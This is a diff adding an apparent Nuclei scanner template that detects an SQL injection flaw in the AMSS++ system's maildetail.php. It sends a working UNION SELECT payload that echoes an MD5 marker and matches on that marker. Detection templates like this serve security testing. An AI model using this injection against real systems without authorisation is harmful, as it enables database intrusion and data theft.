@@ -1,0 +1,24 @@
+id: AMSS-sqli
+
+info:
+  name: AMSS sqli
+  author: Str1am    
+  severity: high
+  description: AMSS++系统maildetail.php文件存在SQL注入漏洞
+  reference: http://www.str1am.top
+  tags: AMSS,sqli
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/modules/mail/main/maildetail.php?id=-1%27%20union%20all%20select%201,2,md5(4756),md5(4756),md5(4756),6,7,8,md5(4756),md5(4756),md5(4756),12,13,14,15,16,17,18--%20-"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "c678aec6e828c899b32a099c14ee882c"
+        part: body
+        condition: and
